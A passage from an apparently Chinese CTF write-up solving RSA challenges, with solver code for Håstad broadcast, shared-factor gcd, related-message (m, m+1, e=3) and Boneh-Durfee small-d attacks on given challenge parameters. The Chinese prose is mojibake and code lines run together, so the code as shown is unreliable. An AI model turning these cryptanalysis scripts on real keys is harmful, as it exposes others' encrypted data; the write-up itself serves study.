punctuation">]</span>    C <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">]</span>    N <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        N <span class="token operator">*=</span> i    Ni <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        Ni<span class="token punctuation">.</span>append<span class="token punctuation">(</span>N <span class="token operator">/</span> i<span class="token punctuation">)</span>    T <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>append<span class="token punctuation">(</span>long<span class="token punctuation">(</span>invert<span class="token punctuation">(</span>Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    X <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        X <span class="token operator">+=</span> C<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    m3 <span class="token operator">=</span> X <span class="token operator">%</span> N    m <span class="token operator">=</span> iroot<span class="token punctuation">(</span>m3<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>m <span class="token operator">=</span> hex<span class="token punctuation">(</span>broadcast<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">,</span>n3<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><p>è‹¥æ˜¯ç»™å‡ºä¸¤ç»„nçš„è¯ï¼Œç›´æ¥å¯ä»¥é‡‡ç”¨æ±‚ä¸¤ä¸ªnçš„å…¬çº¦æ•°çš„æ–¹æ³•è¿›è¡Œæ”»å‡»ã€‚</p><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># from libnum import gcd</span><span class="token comment" spellcheck="true"># n1=0xb4e9991d2fac12b098b01118d960eb5470261368e7b1ff2da2c66b4302835aa845dd50a4f749fea749c6d439156df6faf8d14ce2a57da3bac542f1843bfc80dfd632e7a2ef96496a660d8c5994aea9e1b665097503558bc2756ab06d362abe3777d8c1f388c8cd1d193955b70053382d330125bdc2cdc836453f1a26cec1021cbb787977336b2300f38c6ba881a93d2a2735f8f0d32ea2d0e9527eb15294dd0867c8030d1f646bd121c01706c247cd1bf4aa209d383ffb748b73ec1688dc71812675834b4b12d27a63b5b8fcc47394d16897ff96af49f39d8d5b247553fbf8fac7be08aab43d9ce5659cd5cfaf7d73edbcfe854d997ae4b28d879adf86641707</span><span class="token comment" spellcheck="true"># #  e1=0x10001</span><span class="token comment" spellcheck="true"># #  c1=0x3a10c58ed3e8f9eade48dad7d36518dabeeca3d169c848f3b4b2bb027220e13d8b071c55046b14213e966ad9c381e5cad9773d455aa0d36ddff9b9f24873d0979f1caff95d9569e4f312514c7e01979b39c466aa2d27ad521ae3c1ea2025ca2290185b3d79da4f6e4c7e77a70f206bd5c41eec65fd64f86c317b8207ca511b8297b597cb9c24afa652c1f1c7f2d8ca61cf4a63b17df165e4c02dc19578305f276cb81fdfadf0ffc8b86e13297f2692edf7e6324878bb8ca960a050af6b0ada8ba4accd72c7d2c74a41e98d801093e4cc5b1572b8e6be9f270c30759543986180bb4fc6863e14638ea74863dbdd1624cfdedaedb99dfd48901e7d4b486a7b13ea</span><span class="token comment" spellcheck="true"># n2=0xc31344c753e25135d5eed8febaa57dd7020b503a5569bdd4ae6747b5c36436dc1c4d7ead77bfc1034748bcc630636bae1c8f4ca5dee8246b3d6f3e8b14e16487733b14ec8e587e07a7a6de45859d32d241eaf7746c45ff404f1a767ab77e8493ae8141fee0bcf4e9b7c455415b6945fa60de928b01dfa90bbf0d09194f93db7a1663121d281c908f0e38237f63c2b856f99c6029d993f9afb5fbbb762044d97943ff34023486c4cf1db9ffdc439d9f5ff331b606374c7133d61e4614fac3ea7faaf54563338b736282658e7925b224577091831351a28679a8d6f8e7ba16685b2769bb49b79f8054b29c809d68aca0f2c5e3f1fd0e3ef6c21f756e3c44a40439</span><span class="token comment" spellcheck="true"># # e2=0x10001</span><span class="token comment" spellcheck="true"># # c2=0xbefa7d62f15cafc81d098fdd524411537e948d83266ef22848f44d2e43d1f1388a26bb21c8fb08b571c7cbd6630d6f2b409c85c68a6419e472941e4978f60b93e1ce850344dbe99f1918cb5b8c35075bbdca82fa233d1300f108e4b75ce10d7b0ffa145bceffbc7a5204bf9c119f77af191091f25140aedcdd333b631b240ddad3108c96084dffe6e49e04880908fa02c02edb58e2f27919d707151adb6787384ca28050f8d77418cc1733187d7695f57127be8d6174562723679ba39790d7f2306271b9d8f4d2bdde9ed798af00074ec7da3a7f1ffeb4fc6a61804e51c0f92d384dc62b80fd44492588af26ac0185a23f86c46a7ffdec9fcf31b02b08b63001</span><span class="token comment" spellcheck="true"># print "p -> {}".format(gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q1 -> {}".format(n1 / gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q2 -> {}".format(n2 / gcd(n1, n2))</span>q <span class="token operator">=</span> <span class="token number">161993393900030566867150602363721535479433489542726899362944130872107225598993516228193877689420023695231584876954537089973673478074348422697619820309397363583748523503035462772765277978491082324620122838540365168604124924805412323471486221429513024367107238770298040268787441768635257727315317704741778501737</span>p1 <span class="token operator">=</span> <span class="token number">92392842076088454558676873885205432277688794102622657192126179753576488966439636785821047115301443362169549898465575056742381428321997570097374526363913597739756884031644135343404225885226264566916462715686341654211514913366341960827374747754358972050549971216117165750261475461979495685882564817634194301271</span>p2 <span class="token operator">=</span> <span class="token number">90279376687119715076904357810855212347782022402759254635072438787841245581930716927541800564582197695494423401147385731042364986596482750220701857807271816829238846312998439918616452075752787878425283820635199121653984306111110530896331011530772771558835563313746863033189248831495407320154948117671577602867</span><span class="token comment" spellcheck="true">#p=getPrime(1024)</span><span class="token comment" spellcheck="true">#q=getPrime(1024)</span>e<span class="token operator">=</span><span class="token number">65537</span>n<span class="token operator">=</span>p1<span class="token operator">*</span>qc <span class="token operator">=</span> <span class="token number">2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597</span>fn <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token number">3966878437245643631637564975732704690837306124446086877872976205025646385675581853511438558449272831057566720069483322716185302889500282616707242022434828280064159692586323031389171478503753908040157812124377949328353938367107704570961998942943251122002994862593199357765354157601632561816952286250637771656438228389552713018311110406430345367091645709437632368795499521650765928713846948596775009799649123556193038678824282362527557831582015129491351042998117090300454963836491928898672785463727735926420386710315758459309854603319606229977802586942578329763497502143858265135463947731426008988290087504887177240673</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><h2 id="âChallenge-5"><a href="#âChallenge-5" class="headerlink" title="âChallenge 5"></a>âChallenge 5</h2><p>å·²çŸ¥nå’Œä¸¤ä¸ªcipherï¼Œå¹¶ä¸”æ˜¯ç”±må’Œm+1åŠ å¯†è€Œæ¥ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">5</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>x<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eL</code></pre><p>é€šè¿‡åŒ–ç®€å¾—åˆ° <code>è®¡ç®—å…¬å¼ï¼š (m+1)^3 - m^3 = c2-c1 ==&gt; (3m^2+3m+1)åŠ å‡k*n=c2-c1</code></p><p>ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹æ±‚æ ¹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190529105312.png" alt=""></p><p>æ­¤æ—¶åªéœ€æ±‚ç¬¦åˆæ¡ä»¶çš„kå€¼å³å¯ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token comment" spellcheck="true"># æ±‚ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹æ ¹</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93Lc1<span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cLc2<span class="token operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eLe<span class="token operator">=</span><span class="token number">3</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true"># 3m^2+3m+1=c2-c1</span><span class="token comment" spellcheck="true"># åªå­˜åœ¨ä¸€ä¸ªmæ—¶ â–² = 9-4*3*(1-c2+c1) = 0 </span><span class="token comment" spellcheck="true">#c = 1-c2+c1</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span>n<span class="token operator">*</span>k<span class="token operator">+</span><span class="token punctuation">(</span>c1<span class="token operator">-</span>c2<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(c)</span>    delta <span class="token operator">=</span> <span class="token number">9</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">*</span>c    <span class="token comment" spellcheck="true">#print(delta)</span>    <span class="token keyword">if</span> delta<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#print(iroot(delta,2)[1])</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span>delta<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    m<span class="token operator">=</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">6</span> <span class="token comment" spellcheck="true">#æ±‚æ ¹</span>                    <span class="token keyword">if</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">==</span>c1<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#i = 17æ—¶ç¬¦åˆæ¡ä»¶</span>                        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    k <span class="token operator">+=</span> <span class="token number">1</span></code></pre><h2 id="âChallenge-6"><a href="#âChallenge-6" class="headerlink" title="âChallenge 6"></a>âChallenge 6</h2><p>Boneh and Durfee attack.ï¼ˆå½“dçš„bitsæ•°å°äºnçš„ä¸€å®šç¨‹åº¦æ—¶ï¼Œå¯é‡‡ç”¨æ­¤æ”»å‡»ã€‚é¢˜ä¸­å‡ºç°äº†<code>d=random.getrandbits(1024*0.270)</code>ï¼‰</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">6</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">0.270</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span>invmod<span class="token punctuation">(</span>d<span class="token punctuation">,</span>phin<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hex<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">=</span>0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time<span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Config</span><span class="token comment" spellcheck="true">##########################################</span><span class="token triple-quoted-string string">"""Setting debug to true will display more informationsabout the lattice, the bounds, the vectors..."""</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token triple-quoted-string string">"""Setting strict to true will stop the algorithm (andreturn (-1, -1)) if we don't have a correct upperbound on the determinant. Note that this doesn't necesseraly mean that no solutions will be found since the theoretical upperbound isusualy far away from actual results. That is whyyou should probably use `strict = False`"""</span>strict <span class="token operator">=</span> <span class="token boolean">False</span><span class="token triple-quoted-string string">"""This is experimental, but has provided remarkable resultsso far. It tries to reduce the lattice as much as it canwhile keeping its efficiency. I see no reason not to usethis option, but if things don't work, you should trydisabling it"""</span>helpful_only <span class="token operator">=</span> <span class="token boolean">True</span>dimension_min <span class="token operator">=</span> <span class="token number">7</span> <span class="token comment" spellcheck="true"># stop removing if lattice reaches that dimension</span><span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Functions</span><span class="token comment" spellcheck="true">##########################################</span><span class="token comment" spellcheck="true"># display stats on helpful vectors</span><span class="token keyword">def</span> <span class="token function">helpful_vectors</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span><span class="token punctuation">:</span>    nothelpful <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>ii<span class="token punctuation">]</span> <span class="token operator">>=</span> modulus<span class="token punctuation">:</span>            nothelpful <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">print</span> nothelpful<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">" vectors are not helpful"</span><span class="token comment" spellcheck="true"># display matrix picture with 0 and X</span><span class="token keyword">def</span> <span class="token function">matrix_overview</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> bound<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%02d '</span> <span class="token operator">%</span> ii<span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'X'</span>            <span class="token keyword">if</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>                a <span class="token operator">+=</span> <span class="token string">' '</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'~'</span>        <span class="token keyword">print</span> a<span class="token comment" spellcheck="true"># tries to remove unhelpful vectors</span><span class="token comment" spellcheck="true"># we start at current = n-1 (last vector)</span><span class="token keyword">def</span> <span class="token function">remove_unhelpful</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># end of our recursive function</span>    <span class="token keyword">if</span> current <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">or</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> dimension_min<span class="token punctuation">:</span>        <span class="token keyword">return</span> BB    <span class="token comment" spellcheck="true"># we start by checking from the end</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>current<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># if it is unhelpful:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            affected_vectors <span class="token operator">=</span> <span class="token number">0</span>            affected_vector_index <span class="token operator">=</span> <span class="token number">0</span>            <span class="token comment" spellcheck="true"># let's check if it affects other vectors</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true"># if another vector is affected:</span>                <span class="token comment" spellcheck="true"># we increase the count</span>                <span class="token keyword">if</span> BB<span class="token punctuation">[</span>jj<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                    affected_vectors <span class="token operator">+=</span> <span class="token number">1</span>                    affected_vector_index <span class="token operator">=</span> jj            <span class="token comment" spellcheck="true"># level:0</span>            <span class="token comment" spellcheck="true"># if no other vectors end up affected</span>            <span class="token comment" spellcheck="true"># we remove it</span>            <span class="token keyword">if</span> affected_vectors <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vector"</span><span class="token punctuation">,</span> ii                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> BB            <span class="token comment" spellcheck="true"># level:1</span>            <span class="token comment" spellcheck="true"># if just one was affected we check</span>            <span class="token comment" spellcheck="true"># if it is affecting someone else</span>            <span class="token keyword">elif</span> affected_vectors <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                affected_deeper <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>affected_vector_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true"># if it is affecting even one vector</span>                    <span class="token comment" spellcheck="true"># we give up on this one</span>                    <span class="token keyword">if</span> BB<span class="token punctuation">[</span>kk<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                        affected_deeper <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token comment" spellcheck="true"># remove both it if no other vector was affected and</span>                <span class="token comment" spellcheck="true"># this helpful vector is not helpful enough</span>                <span class="token comment" spellcheck="true"># compared to our unhelpful one</span>                <span class="token keyword">if</span> affected_deeper <span class="token operator">and</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vectors"</span><span class="token punctuation">,</span> ii<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> affected_vector_index                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>affected_vector_index<span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                    BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> BB    <span class="token comment" spellcheck="true"># nothing happened</span>    <span class="token keyword">return</span> BB<span class="token triple-quoted-string string">""" Returns:* 0,0   if it fails* -1,-1 if `strict=true`, and determinant doesn't bound* x0,y0 the solutions of `pol`"""</span><span class="token keyword">def</span> <span class="token function">boneh_durfee</span><span class="token punctuation">(</span>pol<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> 